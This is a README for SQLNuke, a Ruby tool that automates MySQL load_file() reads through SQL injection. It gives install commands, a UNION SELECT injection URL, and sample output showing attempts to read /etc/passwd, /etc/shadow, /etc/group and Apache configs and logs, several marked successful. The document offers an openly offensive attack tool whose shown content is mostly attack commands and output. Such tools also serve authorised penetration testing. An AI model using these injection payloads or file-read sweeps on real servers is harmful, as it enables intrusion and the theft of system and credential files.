### SQLNuke
A powerful MYSQL Injection load_file() Fuzzer
SQLNuke is Simple SQL Injection load_file() fuzzer written in Object Oriented ruby version 1.8.7 .

In SQL Injection and when you need to gather some information out of the server . the best way you can think of is load_file() <a href="http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function_load-file">http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function_load-file</a> function . and it take a amount of time when you have to guess and do it manually, so the idea of SQLNuke is to help to make the process fast and guess the internal common files using a list file.</p>

##Usage Clip
![SQLNuke](http://www.pixentral.com/pics/1rMmil6o1pSBnRFOQC8bpjdQvp.gif "SQLNuke")

## Requirements 
**git**
```
$ sudo apt-get install git-core
$ which git
_/usr/bin/git_
$ git --version
_git version 1.7.0.4_
```
**ruby  (Ubuntu)**

```
$ sudo apt-get install ruby
```
**SQLNuke Installation**

```
$ git clone https://github.com/nuke99/sqlnuke.git
$ cd sqlnuke
$ ./sql.rb
```
**Basic Usage**



```
root@hakb0x:/sqlnuke# ./sql.rb -u 'http://localhost/index.php?id=-1+UNION+SELECT+1,XxxX,3--'
[!] localhost folder already exists
[!] No OS selected, Continue with all the possibilities 
[200] - [Failed]     /etc/apache2/logs/access.log 
[200] - [Success]    /etc/hosts  
[200] - [Failed]     /home/apache/httpd.conf 
[200] - [Failed]     /usr/local/apache2/conf/httpd.conf 
[200] - [Failed]     /etc/apache2/vhosts.d/default_vhost.include 
[200] - [Failed]     /etc/apache2/apache2.conf 
[200] - [Failed]     /opt/apache/conf/httpd.conf 
[200] - [Failed]     /usr/local/apache/conf/httpd.conf 
[200] - [Failed]     /var/www/vhosts/sitename/httpdocs//etc/init.d/apache 
[200] - [Success]    /etc/passwd  
[200] - [Failed]     /etc/apache/apache.conf 
[200] - [Failed]     /etc/httpd/conf/httpd.conf 
[200] - [Failed]     /home/apache/conf/httpd.conf 
[200] - [Failed]     /etc/apache2/sites-available/default 
[200] - [Failed]     /etc/apache/httpd.conf 
[200] - [Failed]     /etc/httpd/access.log 
[200] - [Failed]     /etc/apache2/httpd.conf 
[200] - [Failed]     /etc/httpd/httpd.conf 
[200] - [Failed]     /etc/init.d/apache2/httpd.conf 
[200] - [Failed]     /etc/init.d/apache/httpd.conf 
[200] - [Success]    /etc/group  
[200] - [Failed]     C:/wamp/bin/apache/logs/access.log 
[200] - [Failed]     /etc/shadow 
....

[+] Saved files are in 'output/localhost'

```


###  Support or Contact @nuke_99
Twitter : https://twitter.com/nuke_99
